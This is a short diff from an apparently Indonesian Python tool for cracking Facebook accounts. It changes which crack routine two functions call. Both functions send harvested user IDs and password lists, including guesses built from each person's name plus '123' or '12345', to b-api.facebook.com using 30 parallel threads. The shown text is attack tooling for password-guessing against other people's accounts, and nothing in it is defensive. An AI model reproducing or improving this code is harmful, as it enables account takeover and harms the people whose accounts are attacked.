@@ -651,7 +651,7 @@ def sandimanual():
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				uid, name = user.split("<=>")
-				fall.submit(bapi, uid, pwek.split(","),"https://b-api.facebook.com")
+				fall.submit(mfbasic, uid, pwek.split(","),"https://b-api.facebook.com")
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	
 def sandiotomatis():
@@ -711,7 +711,7 @@ def sandiotomatis():
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
 				else:
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
-				fall.submit(bapi, uid, pwx,"https://b-api.facebook.com")
+				fall.submit(mfbasic, uid, pwx,"https://b-api.facebook.com")
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 		
 ### BAGIAN CRACK ###
